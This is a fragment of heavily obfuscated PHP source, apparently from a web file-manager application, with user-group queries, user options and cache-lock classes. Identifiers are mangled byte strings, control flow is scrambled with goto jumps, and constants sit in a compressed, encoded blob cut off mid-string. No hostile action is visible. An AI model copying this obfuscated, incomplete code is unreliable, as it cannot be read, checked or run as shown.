$dí–†´ø); } return Model($Cè…¢¦ä…ë[2189])->addAll($A™­·ÂïÓ–, array(), !0); } protected function userGroupRemove($bî‹œôÎ¹¾, $BÃƒÊÙ›“¯) { $AíœÖ»“Ä =& $_SERVER[³‘’¼äÑ™ÔÍ]; $DòºŒ‘¸¬è = $this->getInfoSimple($bî‹œôÎ¹¾); if (!$DòºŒ‘¸¬è || !$BÃƒÊÙ›“¯) { return !1; } $cïï©¡Î¸¼ = array($AíœÖ»“Ä[1436] => $bî‹œôÎ¹¾, $AíœÖ»“Ä[2187] => $BÃƒÊÙ›“¯); return Model($AíœÖ»“Ä[2189])->where($cïï©¡Î¸¼)->delete(); } public function listData() { $f¢çÚ‰–¸ğ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($f¢çÚ‰–¸ğ[$_SERVER[³‘’¼äÑ™ÔÍ][354]]); return $f¢çÚ‰–¸ğ; } public function listByID($aº·’´ö…µ) { $Fê–éÈ»»¨ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$aº·’´ö…µ) { return; } $AÏÀÛ‚Ã„ = array($Fê–éÈ»»¨[1445] => array($Fê–éÈ»»¨[7], $aº·’´ö…µ)); $Dí‰¨öî±  = $this->where($AÏÀÛ‚Ã„)->select(); $this->_listDataApply($Dí‰¨öî± ); return $Dí‰¨öî± ; } public function listByGroup($cÚ’×±Ô = 0, $E……À¤•Ãƒ = array()) { goto DáŠôŠç¦‘; càò­¸Ï¡: $this->_listDataApply($e³µë¸§è[$AÖÈÑ•À×­[354]]); return $e³µë¸§è; goto d¸æìğöÜÈ; DáŠôŠç¦‘: $AÖÈÑ•À×­ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EŠ¥“ïÇÑ = $AÖÈÑ•À×­[33]; $eòš•íî·¢ = array(); goto cø÷šÑšÊÛ; cø÷šÑšÊÛ: if ($cÚ’×±Ô) { $eòš•íî·¢ = array($AÖÈÑ•À×­[2539] => intval($cÚ’×±Ô)); $EŠ¥“ïÇÑ = "\114\x45\106\x54\40\x4a\x4f\111\116\x20{$this->tablePrefix}\x75\x73\145\x72\137\x67\162\157\x75\x70\40\x75\163\145\x72\137\147\x72\x6f\x75\x70\x20\157\x6e\x20\x75\163\145\162\x2e\165\x73\x65\x72\x49\x44\40\75\40\165\163\x65\162\137\x67\x72\x6f\x75\x70\x2e\165\163\x65\162\111\x44"; $aâ™ìµŒ = Input::get($AÖÈÑ•À×­[407], null, $AÖÈÑ•À×­[33]) ? $AÖÈÑ•À×­[33] : $AÖÈÑ•À×­[2540]; } if (isset($E……À¤•Ãƒ[$AÖÈÑ•À×­[692]])) { $eòš•íî·¢[$AÖÈÑ•À×­[2541]] = $E……À¤•Ãƒ[$AÖÈÑ•À×­[692]]; } $e³µë¸§è = $this->_makeOrder($aâ™ìµŒ)->field($AÖÈÑ•À×­[2542])->where($eòš•íî·¢)->join($EŠ¥“ïÇÑ)->selectPage(50); goto càò­¸Ï¡; d¸æìğöÜÈ: } private function _makeOrder($f­ ”¿ùÌ¶ = '') { goto F…ƒÌ£ï·Ê; F…ƒÌ£ï·Ê: $fÁºÓƒÜé =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F°ÉÈÁ…Ÿ„ = array($fÁºÓƒÜé[1445], $fÁºÓƒÜé[28], $fÁºÓƒÜé[2099], $fÁºÓƒÜé[2071], $fÁºÓƒÜé[187]); $eÉ­£öäŞŒ = array($fÁºÓƒÜé[402] => $fÁºÓƒÜé[403], $fÁºÓƒÜé[404] => $fÁºÓƒÜé[405]); goto DÇÊÄ÷Ä±å; DÇÊÄ÷Ä±å: $D×Ï¤µø = Input::get($fÁºÓƒÜé[407], $fÁºÓƒÜé[7], $fÁºÓƒÜé[1436], $F°ÉÈÁ…Ÿ„); $A¤ß•¯„ = Input::get($fÁºÓƒÜé[408], $fÁºÓƒÜé[7], $fÁºÓƒÜé[2190], array($fÁºÓƒÜé[2190], $fÁºÓƒÜé[404])); $A¤ß•¯„ = $eÉ­£öäŞŒ[$A¤ß•¯„]; goto E·Ò¢‡ÕÑ; E·Ò¢‡ÕÑ: $f­ ”¿ùÌ¶ = $f­ ”¿ùÌ¶ . "\165\x73\145\162\56{$D×Ï¤µø}\x20{$A¤ß•¯„}\x2c\x20\x75\x73\145\162\x2e\x75\x73\145\x72\111\x44\40\x61\x73\x63"; return $this->alias($fÁºÓƒÜé[2288])->order($f­ ”¿ùÌ¶); goto C¹÷‰§«»Â; C¹÷‰§«»Â: } public function listSearch($eå·¹æè„ß) { goto D¯ŞÕ·°‹§; D¼°ˆÅëô: $EÕÍÎ’òİŒ = str_replace($C»éËäØªŒ[2193], $C»éËäØªŒ[2194], trim($EÕÍÎ’òİŒ)); $F†ÀªŠ†ø¹ = array($C»éËäØªŒ[28] => array($C»éËäØªŒ[755], "\45{$EÕÍÎ’òİŒ}\45"), $C»éËäØªŒ[293] => array($C»éËäØªŒ[755], "\x25{$EÕÍÎ’òİŒ}\45"), $C»éËäØªŒ[2345] => array($C»éËäØªŒ[755], "\x25{$EÕÍÎ’òİŒ}\45"), $C»éËäØªŒ[918] => $C»éËäØªŒ[2195]); if (Input::check($EÕÍÎ’òİŒ, $C»éËäØªŒ[299])) { $F†ÀªŠ†ø¹[$C»éËäØªŒ[1445]] = array($C»éËäØªŒ[755], "\45{$EÕÍÎ’òİŒ}\45"); $F†ÀªŠ†ø¹[$C»éËäØªŒ[2523]] = array($C»éËäØªŒ[755], "\45{$EÕÍÎ’òİŒ}\x25"); } goto C¬ªƒ–óĞï; D¯ŞÕ·°‹§: $C»éËäØªŒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EÕÍÎ’òİŒ = $eå·¹æè„ß[$C»éËäØªŒ[2191]]; $dã¢ìµ‹¥ = isset($eå·¹æè„ß[$C»éËäØªŒ[2192]]) ? $eå·¹æè„ß[$C»éËäØªŒ[2192]] : !1; goto D¼°ˆÅëô; Dõ‹ÑîÕï: return $EôñáŠÑùë; goto CŒæ³ĞÔŞó; Aˆå¥Öí–À: if (!$EôñáŠÑùë || count($EôñáŠÑùë[$C»éËäØªŒ[354]]) < 5 && Input::check($EÕÍÎ’òİŒ, $C»éËäØªŒ[306])) { $B¾êŒÏ‘æ = $this->_searchFromMeta($C»éËäØªŒ[415], $EÕÍÎ’òİŒ, 10); $fğˆ¬ŒèÉ = $this->_searchFromMeta($C»éËäØªŒ[416], $EÕÍÎ’òİŒ, 10); $cÏ¡ËÂèˆß = array_merge($B¾êŒÏ‘æ, $fğˆ¬ŒèÉ, $EôñáŠÑùë[$C»éËäØªŒ[354]]); $EôñáŠÑùë[$C»éËäØªŒ[354]] = array_unique_by_key($cÏ¡ËÂèˆß, $C»éËäØªŒ[1445]); $EôñáŠÑùë[$C»éËäØªŒ[351]][$C»éËäØªŒ[352]] = count($EôñáŠÑùë[$C»éËäØªŒ[354]]); $EôñáŠÑùë[$C»éËäØªŒ[351]][$C»éËäØªŒ[353]] = ceil($EôñáŠÑùë[$C»éËäØªŒ[351]][$C»éËäØªŒ[352]] / $EôñáŠÑùë[$C»éËäØªŒ[351]][$C»éËäØªŒ[349]]); } $this->_listDataApply($EôñáŠÑùë[$C»éËäØªŒ[354]]); $this->_filterByGroup($EôñáŠÑùë, $dã¢ìµ‹¥); goto Dõ‹ÑîÕï; C¬ªƒ–óĞï: if (!$EÕÍÎ’òİŒ) { $F†ÀªŠ†ø¹ = array(); } if (isset($eå·¹æè„ß[$C»éËäØªŒ[692]])) { $F†ÀªŠ†ø¹[$C»éËäØªŒ[692]] = $eå·¹æè„ß[$C»éËäØªŒ[692]]; } $EôñáŠÑùë = $this->_makeOrder()->where($F†ÀªŠ†ø¹)->selectPage(20); goto Aˆå¥Öí–À; CŒæ³ĞÔŞó: } private function _filterByGroup(&$A¢ÖŠÏ¡¿„, $cÈÌ¼‡ÕŒÃ) { $aÆøÍÏïï¨ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$cÈÌ¼‡ÕŒÃ) { return $A¢ÖŠÏ¡¿„; } foreach ($A¢ÖŠÏ¡¿„[$aÆøÍÏïï¨[354]] as $f¹ÀÂª“‘ => &$EÃ¯ØÖ’ƒÇ) { $CŸ«÷ê‘Õ = array_to_keyvalue($EÃ¯ØÖ’ƒÇ[$aÆøÍÏïï¨[2543]], $aÆøÍÏïï¨[33], $aÆøÍÏïï¨[2113]); if (!in_array($cÈÌ¼‡ÕŒÃ, $CŸ«÷ê‘Õ)) { unset($A¢ÖŠÏ¡¿„[$aÆøÍÏïï¨[354]][$f¹ÀÂª“‘]); } } $A¢ÖŠÏ¡¿„[$aÆøÍÏïï¨[354]] = array_values($A¢ÖŠÏ¡¿„[$aÆøÍÏïï¨[354]]); $A¢ÖŠÏ¡¿„[$aÆøÍÏïï¨[351]] = array($aÆøÍÏïï¨[2321] => count($A¢ÖŠÏ¡¿„[$aÆøÍÏïï¨[354]]), $aÆøÍÏïï¨[2319] => $A¢ÖŠÏ¡¿„[$aÆøÍÏïï¨[351]][$aÆøÍÏïï¨[349]], $aÆøÍÏïï¨[2318] => 1, $aÆøÍÏïï¨[2320] => 1); } private function _searchFromMeta($bÜæŠõ…É, $FÓ‚®ƒó°, $fõ¿Ë™Ã„³) { goto C†¤‚ˆÕ……; BÛçµáÒò¹: $cÔÅ¸‹±Ó¡ = Model($cÒ˜³’—‡[2544])->where($e«¥Ï°çø)->limit($fõ¿Ë™Ã„³)->select(); if (!$cÔÅ¸‹±Ó¡) { return array(); } $cÔÅ¸‹±Ó¡ = array_to_keyvalue($cÔÅ¸‹±Ó¡, $cÒ˜³’—‡[33], $cÒ˜³’—‡[1445]); goto aÌÚ˜Ö†µ; C†¤‚ˆÕ……: $cÒ˜³’—‡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FÓ‚®ƒó° = strtolower($FÓ‚®ƒó°); $e«¥Ï°çø = array($cÒ˜³’—‡[89] => $bÜæŠõ…É, $cÒ˜³’—‡[359] => array($cÒ˜³’—‡[755], "\x25{$FÓ‚®ƒó°}\45")); goto BÛçµáÒò¹; aÌÚ˜Ö†µ: $bñÅğÊ÷¹„ = $this->where(array($cÒ˜³’—‡[1436] => array($cÒ˜³’—‡[7], $cÔÅ¸‹±Ó¡)))->select(); if (!$bñÅğÊ÷¹„) { return array(); } return $bñÅğÊ÷¹„; goto EŸ§Š‹‚¹; EŸ§Š‹‚¹: } private function _listDataApplyItem($CÏÁº¡Ğ±) { $e„ªÉ¢éÅ = array($CÏÁº¡Ğ±); $this->_listDataApply($e„ªÉ¢éÅ); return $e„ªÉ¢éÅ[0]; } private function _listDataApply(&$FèæÑ‚Š’) { goto aÉÄÂöìÒ’; f‹¦ ¯òÏ: $báÕ‚Éîåí = array_to_keyvalue($FèæÑ‚Š’, $e¬Ï¶Œ’[33], $e¬Ï¶Œ’[1445]); $this->_listAppendGroup($FèæÑ‚Š’, $báÕ‚Éîåí); $this->_listAppendMeta($FèæÑ‚Š’, $báÕ‚Éîåí); goto ešŞÃ–ÂŸ; ešŞÃ–ÂŸ: $this->_listAppendSourceRoot($FèæÑ‚Š’, $báÕ‚Éîåí); goto a–å•°¯“œ; aÉÄÂöìÒ’: $e¬Ï¶Œ’ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$FèæÑ‚Š’) { return; } array_remove_key($FèæÑ‚Š’, $e¬Ï¶Œ’[806]); goto f‹¦ ¯òÏ; a–å•°¯“œ: } private function _listAppendSourceRoot(&$aÄíôï‹Ş‡, $E¸Š„ÏĞàÍ) { goto C¹…ÄÏÏà×; fàƒ…½Ñ¾: foreach ($aÄíôï‹Ş‡ as &$D©Ü‰ÓµÍÅ) { $D©Ü‰ÓµÍÅ[$Bß¨öª®«[391]] = $D„¶éîÙÄè[$D©Ü‰ÓµÍÅ[$Bß¨öª®«[1445]]] ? $D„¶éîÙÄè[$D©Ü‰ÓµÍÅ[$Bß¨öª®«[1445]]] : array(); } goto dÃ¬¹ˆƒ†; C¹…ÄÏÏà×: $Bß¨öª®« =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AÆ†õŠ—˜ = array($Bß¨öª®«[461] => 0, $Bß¨öª®«[371] => SourceModel::TYPE_USER, $Bß¨öª®«[456] => array($Bß¨öª®«[7], $E¸Š„ÏĞàÍ)); $b”–”ùŸã¾ = $Bß¨öª®«[2202]; goto cì°ç§ÑèÂ; cì°ç§ÑèÂ: $D„¶éîÙÄè = Model($Bß¨öª®«[756])->order($Bß¨öª®«[2203])->field($b”–”ùŸã¾)->where($AÆ†õŠ—˜)->select(); $D„¶éîÙÄè = array_to_keyvalue($D„¶éîÙÄè, $Bß¨öª®«[456]); $D„¶éîÙÄè = array_remove_key($D„¶éîÙÄè, $Bß¨öª®«[456]); goto fàƒ…½Ñ¾; dÃ¬¹ˆƒ†: } private function _listAppendGroup(&$fï«à‚Å¢, $EŞ„ŠÈà‹Æ) { goto Eê‹Ş½Œ¥Ú; Cô‡Åòµ†±: $bõ¥¢Ó‘ = array($E‡öˆÎ¤ÜÄ[2113] => array($E‡öˆÎ¤ÜÄ[7], $cˆËšåÙ­)); $bµ±Ââáñ = Model($E‡öˆÎ¤ÜÄ[2545])->field($E‡öˆÎ¤ÜÄ[2546])->where($bõ¥¢Ó‘)->select(); $c®ŒšŠ®ç“ = array_to_keyvalue($bµ±Ââáñ, $E‡öˆÎ¤ÜÄ[2113], $E‡öˆÎ¤ÜÄ[28]); goto f‚ŒÎ×’í; f‚ŒÎ×’í: $EÒÎ¯Şä = array_to_keyvalue_group($EÒÎ¯Şä, $E‡öˆÎ¤ÜÄ[1445]); foreach ($EÒÎ¯Şä as &$B½ÇˆéÀ—‚) { $Fœ¡ÌÜö¡ï = array(); foreach ($B½ÇˆéÀ—‚ as $A Üòœëì­) { if (!$A Üòœëì­[$E‡öˆÎ¤ÜÄ[2244]]) { continue; } $dŒ¢ƒ„½æ… = Model($E‡öˆÎ¤ÜÄ[2263])->listData($A Üòœëì­[$E‡öˆÎ¤ÜÄ[2244]]); $Fœ¡ÌÜö¡ï[] = array($E‡öˆÎ¤ÜÄ[2113] => $A Üòœëì­[$E‡öˆÎ¤ÜÄ[2113]], $E‡öˆÎ¤ÜÄ[2547] => $c®ŒšŠ®ç“[$A Üòœëì­[$E‡öˆÎ¤ÜÄ[2113]]], $E‡öˆÎ¤ÜÄ[376] => $dŒ¢ƒ„½æ…); } $B½ÇˆéÀ—‚ = $Fœ¡ÌÜö¡ï; } foreach ($fï«à‚Å¢ as &$Dé´ğ½İÒ) { $Dé´ğ½İÒ[$E‡öˆÎ¤ÜÄ[2543]] = array(); if (isset($EÒÎ¯Şä[$Dé´ğ½İÒ[$E‡öˆÎ¤ÜÄ[1445]]])) { $Dé´ğ½İÒ[$E‡öˆÎ¤ÜÄ[2543]] = $EÒÎ¯Şä[$Dé´ğ½İÒ[$E‡öˆÎ¤ÜÄ[1445]]]; } } goto D×“½¥†â; d˜§´î™çœ: $cˆËšåÙ­ = array_to_keyvalue($EÒÎ¯Şä, $E‡öˆÎ¤ÜÄ[33], $E‡öˆÎ¤ÜÄ[2113]); $cˆËšåÙ­ = array_remove_value(array_unique($cˆËšåÙ­), $E‡öˆÎ¤ÜÄ[468]); if (!$cˆËšåÙ­ || !$EÒÎ¯Şä) { return; } goto Cô‡Åòµ†±; Eê‹Ş½Œ¥Ú: $E‡öˆÎ¤ÜÄ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bõ¥¢Ó‘ = array($E‡öˆÎ¤ÜÄ[1445] => array($E‡öˆÎ¤ÜÄ[7], $EŞ„ŠÈà‹Æ)); $EÒÎ¯Şä = Model($E‡öˆÎ¤ÜÄ[2189])->where($bõ¥¢Ó‘)->select(); goto d˜§´î™çœ; D×“½¥†â: } private function _listAppendMeta(&$CÃ°³ª¾Ìµ, $fšÆö¨ó¦) { goto AÉÚ ù”¸´; AÉÚ ù”¸´: $F‘±Úâ›ø =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bçÇÀÑŸ¾ = UserJobModel::JOB_KEY; $AŞ¡»Ê = array($F‘±Úâ›ø[2525]); goto Aİ†Ş¶¯£; Aİ†Ş¶¯£: $DöĞ·òØ£ = array($F‘±Úâ›ø[1445] => array($F‘±Úâ›ø[7], $fšÆö¨ó¦)); $c¨¥Š’Ç¸ = Model($F‘±Úâ›ø[2522])->where($DöĞ·òØ£)->select(); $c¨¥Š’Ç¸ = array_to_keyvalue_group($c¨¥Š’Ç¸, $F‘±Úâ›ø[1445]); goto eÍ¦¬¨Ì±ì; eÍ¦¬¨Ì±ì: foreach ($c¨¥Š’Ç¸ as &$cœØ·‰Ò†) { $D¤Ø”¬Æ¢ø = array(); foreach ($cœØ·‰Ò† as $D‹œ¨±ëÑò) { if (!in_array($D‹œ¨±ëÑò[$F‘±Úâ›ø[89]], $AŞ¡»Ê)) { $D¤Ø”¬Æ¢ø[$D‹œ¨±ëÑò[$F‘±Úâ›ø[89]]] = $D‹œ¨±ëÑò[$F‘±Úâ›ø[359]]; } } $cœØ·‰Ò† = $D¤Ø”¬Æ¢ø; } $EÂ´„óïù¹ = Model($F‘±Úâ›ø[2548]); foreach ($CÃ°³ª¾Ìµ as &$céğí˜×) { $dÀ¢¢”³ä¿ = array(); if (isset($c¨¥Š’Ç¸[$céğí˜×[$F‘±Úâ›ø[1445]]])) { $dÀ¢¢”³ä¿ = $c¨¥Š’Ç¸[$céğí˜×[$F‘±Úâ›ø[1445]]]; } $céğí˜×[$F‘±Úâ›ø[2549]] = array(); if (isset($dÀ¢¢”³ä¿[$bçÇÀÑŸ¾])) { $céğí˜×[$F‘±Úâ›ø[2549]] = $EÂ´„óïù¹->getUserJobInfo($dÀ¢¢”³ä¿[$bçÇÀÑŸ¾]); } } goto Añù”Îã²; Añù”Îã²: } protected function groupUserAll($B‡åï¦…ëº) { $d„¼İßÌ”à =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$B‡åï¦…ëº) { return !1; } $BÜÌöğÁªË = Model($d„¼İßÌ”à[2189])->field($d„¼İßÌ”à[1445])->where(array($d„¼İßÌ”à[2113] => array($d„¼İßÌ”à[7], $B‡åï¦…ëº)))->select(); $BÜÌöğÁªË = array_to_keyvalue($BÜÌöğÁªË, $d„¼İßÌ”à[33], $d„¼İßÌ”à[1445]); return array_unique($BÜÌöğÁªË); } public function userSearch($dÄæÓó¡…ù, $c”ôµÑˆğ‚ = "\x2a") { return Model($_SERVER[³‘’¼äÑ™ÔÍ][477])->where($dÄæÓó¡…ù)->field($c”ôµÑˆğ‚)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\x72\137\x6f\x70\x74\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($F‰š§À÷ŠÓ) { $FÔëòÕÆ¶é =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!defined($FÔëòÕÆ¶é[427])) { define($FÔëòÕÆ¶é[427], 0); } return "\x55\x73\x65\162\x4f\x70\164\x69\x6f\x6e\x5f{$F‰š§À÷ŠÓ}\137" . USER_ID; } protected function filterWhere($f×®¶„ìÕ) { $E‡–Ñöòğ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!defined($E‡–Ñöòğ[427])) { define($E‡–Ñöòğ[427], 0); } $f×®¶„ìÕ[$E‡–Ñöòğ[1445]] = USER_ID; return $f×®¶„ìÕ; } public function cacheRemoveUser($b•ÀÂ¿å‹â, $Ağ÷Š‹ï±¾) { return Cache::remove("\x55\x73\x65\x72\117\x70\x74\x69\x6f\156\137{$b•ÀÂ¿å‹â}\137" . $Ağ÷Š‹ï±¾); } protected function optionDefault($a·Ñåİô•¯ = '') { $eñˆ…Áß¼Î =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($a·Ñåİô•¯ == $eñˆ…Áß¼Î[33]) { return $GLOBALS[$eñˆ…Áß¼Î[6]][$eñˆ…Áß¼Î[2550]]; } if ($a·Ñåİô•¯ == $eñˆ…Áß¼Î[2551]) { return $GLOBALS[$eñˆ…Áß¼Î[6]][$eñˆ…Áß¼Î[2552]]; } } } goto f•çèä¡¤; bÆÇÅ‡…ùÒ: register_shutdown_function($_SERVER[Êß·®ÍËúû][36]); set_error_handler($_SERVER[Êß·®ÍËúû][49], $C°ğíˆ—æ¸); if (function_exists($_SERVER[Êß·®ÍËúû][50])) { set_exception_handler($_SERVER[Êß·®ÍËúû][51]); } goto Døêš¸ë—; DÔãĞ™ÚÙ: define($_SERVER[³‘’¼äÑ™ÔÍ][0], $_SERVER[³‘’¼äÑ™ÔÍ][1]); $_SERVER[Êß·®ÍËúû] = explode($_SERVER[³‘’¼äÑ™ÔÍ][2], gzinflate(substr($_SERVER[³‘’¼äÑ™ÔÍ][3], 10, -8))); function Model($cõŞÕîÃŸ° = '', $f‡ šõ‘Åµ = '', $D«‡ŠÜØÍÈ = '') { goto aÛ×÷µæ…­; D°ã…Š Î: $bãÇíÑ¾£[$f»¶ï†•±İ] = new ModelBase($cõŞÕîÃŸ°, $f‡ šõ‘Åµ, $D«‡ŠÜØÍÈ); return $bãÇíÑ¾£[$f»¶ï†•±İ]; goto E—©‹Öø½†; Fåõ‰ö·ß­: if (isset($bãÇíÑ¾£[$f»¶ï†•±İ])) { return $bãÇíÑ¾£[$f»¶ï†•±İ]; } if ($cõŞÕîÃŸ°) { $cõŞÕîÃŸ° = strtoupper($cõŞÕîÃŸ°[0]) . substr($cõŞÕîÃŸ°, 1); $cÄöñè†” = $cõŞÕîÃŸ° . $D¹²Õ¹ö[1]; if (class_exists($cÄöñè†”)) { $bãÇíÑ¾£[$f»¶ï†•±İ] = new $cÄöñè†”(); return $bãÇíÑ¾£[$f»¶ï†•±İ]; } } if (!$D«‡ŠÜØÍÈ) { $D«‡ŠÜØÍÈ = $GLOBALS[$D¹²Õ¹ö[2]][$D¹²Õ¹ö[3]]; } goto D°ã…Š Î; aÛ×÷µæ…­: $D¹²Õ¹ö =& $_SERVER[Êß·®ÍËúû]; static $bãÇíÑ¾£ = array(); $f»¶ï†•±İ = strtolower($f‡ šõ‘Åµ . $D¹²Õ¹ö[0] . $cõŞÕîÃŸ°); goto Fåõ‰ö·ß­; E—©‹Öø½†: } goto CŠà¹óÕÓù; f‚Ê³ÈÔÒ: $a­†Ë¯ÕË = $_SERVER[³‘’¼äÑ™ÔÍ][547]; if (strlen($a­†Ë¯ÕË) < $_SERVER[³‘’¼äÑ™ÔÍ][548]) { die; } $_SERVER[Ü âªøğÕå] = explode($_SERVER[³‘’¼äÑ™ÔÍ][549], gzinflate(substr($_SERVER[³‘’¼äÑ™ÔÍ][550], 10, -8))); goto dÅìâ›ï¬ì; cá‡ºÑÂè‹: class CacheLockRedis { public function lock($f÷î¾óàä•, $eŸ´÷Æèâœ = 10) { $D™ËšôŒî‰ = Cache::init(); $Eçö‡İ‚•° = microtime(!0) + $eŸ´÷Æèâœ; while (microtime(!0) < $Eçö‡İ‚•°) { $b¾ÕÓó¶Ï = $D™ËšôŒî‰->get($f÷î¾óàä•); if (!$b¾ÕÓó¶Ï) { $Aºƒíí›Ç‘ = $D™ËšôŒî‰->setLock($f÷î¾óàä•, $Eçö‡İ‚•°, $eŸ´÷Æèâœ); if ($Aºƒíí›Ç‘) { return !0; } } else { if ($b¾ÕÓó¶Ï < microtime(!0)) { $D™ËšôŒî‰->set($f÷î¾óàä•, $Eçö‡İ‚•°, $Eçö‡İ‚•°); if ($D™ËšôŒî‰->get($f÷î¾óàä•) === $b¾ÕÓó¶Ï) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($C¶‘½Å¼Ëæ) { return Cache::init()->get($C¶‘½Å¼Ëæ); } public function unlock($dÖïáÖÀê­) { return Cache::init()->remove($dÖïáÖÀê­); } } class CacheLockMemcached { public function lock($eÃßóŒÏ•¯, $føœÓ÷„„‡ = 0) { $aÖ‰åœÑ¬Ç = Cache::init(); $bòš‹òÏò = microtime(!0) + $føœÓ÷„„‡; while (microtime(!0) < $bòš‹òÏò) { $Bë‰ÈäòêÜ = $aÖ‰åœÑ¬Ç->get($eÃßóŒÏ•¯); if (!$Bë‰ÈäòêÜ || $Bë‰ÈäòêÜ < microtime(!0)) { $D…Ï³¬òŠ = $aÖ‰åœÑ¬Ç->handle->add($eÃßóŒÏ•¯, $bòš‹òÏò, $føœÓ÷„„‡); if ($D…Ï³¬òŠ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($aë‚æ¸¾Ù) { return Cache::init()->get($aë‚æ¸¾Ù); } public function unlock($c…Š£ÕÏõ¨) { return Cache::init()->remove($c…Š£ÕÏõ¨); } } class CacheLockDatabase { public function lock($eì†¢§ç·î, $eÓô‹ğÁô± = 0) { $A†£‹ªóÊ = Model($_SERVER[³‘’¼äÑ™ÔÍ][760]); $C»¿ğëâ = microtime(!0) + $eÓô‹ğÁô±; while (microtime(!0) < $C»¿ğëâ) { $B‚›¦Ó—·Ê = $A†£‹ªóÊ->get($eì†¢§ç·î); if (!$B‚›¦Ó—·Ê || $B‚›¦Ó—·Ê < microtime(!0)) { $F‡Å’‡÷ÌØ = $A†£‹ªóÊ->set($eì†¢§ç·î, $C»¿ğëâ); if ($F‡Å’‡÷ÌØ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($FÅ‰èƒì) { return Model($_SERVER[³‘’¼äÑ™ÔÍ][760])->get($FÅ‰èƒì); } public function unlock($B¢—ÜÄ‚ó) { Model($_SERVER[³‘’¼äÑ™ÔÍ][760])->remove($B¢—ÜÄ‚ó); } } goto c¹‹˜àÑ•·; fĞ¥ò®øœÁ: if (!function_exists('_kodDe')) { function _kodDe($Cá¾ìóº¥Ü) { $Cá¾ìóº¥Ü = base64_decode($Cá¾ìóº¥Ü); $cœœ’­Õ–Ù = strlen($Cá¾ìóº¥Ü); $B¤†İ„²£ = ''; $fÉ¢—ÛÒÏğ = ord($Cá¾ìóº¥Ü[0]) - 30; for ($eŒ©‹êÙ™ù = 1; $eŒ©‹êÙ™ù < $cœœ’­Õ–Ù; $eŒ©‹êÙ™ù += 2) { if ($eŒ©‹êÙ™ù + 1 < $cœœ’­Õ–Ù) { $B¤†İ„²£ .= chr(ord($Cá¾ìóº¥Ü[$eŒ©‹êÙ™ù + 1]) + $fÉ¢—ÛÒÏğ); $B¤†İ„²£ .= chr(ord($Cá¾ìóº¥Ü[$eŒ©‹êÙ™ù]) + $fÉ¢—ÛÒÏğ); } else { $B¤†İ„²£ .= chr(ord($Cá¾ìóº¥Ü[$eŒ©‹êÙ™ù]) + $fÉ¢—ÛÒÏğ); } } return $B¤†İ„²£; } } define("\263\221\222\274\344\321\231\324\315", "\xfc\x83"); $_SERVER[³‘’¼äÑ™ÔÍ] = explode(base64_decode('fAF8AnwD'), gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\x9d\x7d\x7\x60\x5b\xc5\xf9\x78\x81\x32\x2\xe5\xc7\x6a\x29\x65\x3e\x9c\x4\x8f\x68\x78\x65\xe0\xc4\x76\x64\x4b\xb6\x95\xd8\x92\x91\xe4\x38\x89\xe5\x28\x4f\xd2\x93\xf4\x62\x49\x4f\x7e\xef"."\311\53\11\45\314\120\106\241\254\122\166\312\10\264\115\312\10\20\366\12\243\254\122\126\330\224\222\4\50\320\102\12\45\224\361\277\175\367\236\144\150\377\264\216\356\276\373\356\336\215\357\276\373\356\356\373\276".base64_decode('+9OVb92x4eknv/zPqt1W7b5qjxdffuO2B/5yMo6A/+0J/ofCx5y1zw/Qf3vkTngwsHvdgc2HuU7c')."\263\62\270\327\301\377\170\344\244\253\177\177\302\305\167\36\361\323\163\374\341\127\327\344\252\256\270\376\243\216\370\27\143\375\327\77\131\361\327\277\214\273\257\230\275\63\165\372\107\33\77\277\142\365\216\237\114".base64_decode('z5y8+9ML/jBl4dFf/Gql9NINf/7t8uKmRaf/86sfGkMrb7/Ne3vujT2yC/Z5+l7t+Q+ufPCal97+')."\362\333\201\53\266\365\271\16\35\372\315\352\55\217\14\355\373\366\221\115\47\377\353\315\336\303\274\233\367\176\71\334\361\220\353\33\375\330\7\376\163\344\354\345\361\137\270\75\103\173\315\75\360\221\273\173\356"."\x5f\xfa\xaf\x1d\x53\x3f\xad\x3f\x35\x53\xbd\xde\xb9\xfc\x27\xef\x9c\x7d\xe0\x82\xb\x4f\xbd\xea\xb8\x5d\x97\x7e\x7e\xdf\xcf\x16\xb5\xdd\xbd\xac\xed\x95\x46\xe7\x56\xe3\xe2\x67\xb6\x3a\x9e\x7e\x25\x79\xbe\xf7\xa3\x83\x17\xbd\x27"."\315\370\235\364\311\334\147\346\35\236\172\142\217\313\16\330\131\375\311\45\311\107\36\175\342\210\363\37\273\353\332\217\3\257\66\377\370\365\237\51\357\64\337\372\366\205\153\227\245\17\273\160\155\307\243\313\217".base64_decode('2udoaeL+6x74YoE658pNz/7upMM3Zw/4dPMfF71+78plq34UmHnpl2sWHnL5YTsP/KB5vz96rpGn')."\317\276\245\345\333\351\117\313\327\36\42\277\166\354\231\107\274\162\165\144\354\362\3\277\270\275\260\151\260\340\377\162\277\325\115\113\33\336\332\375\7\77\300\35\335\204\177\244\274\146\112\312\230\152\230\6\6"."\44\264\174\112\115\343\260\232\307\277\156\374\143\14\147\125\123\301\341\130\40\30\211\205\373\172\173\175\241\110\214\224\50\246\347\264\44\11\25\144\135\316\221\302\13\212\156\200\117\211\305\305\12\132\101\311\133"."\x20\x1c\x90\x94\x4d\x39\x2e\x1b\xa4\x24\x6f\x5b\xcc\xeb\xeb\xed\xe\x2e\x89\x45\x96\xf4\xfa\x8\x46\x3c\x36\x5c\x54\xf4\x71\x1c\x43\xc1\xb0\x29\xeb\x66\x44\xcd\x29\xc\x63\x54\x67\xf5\x6a\x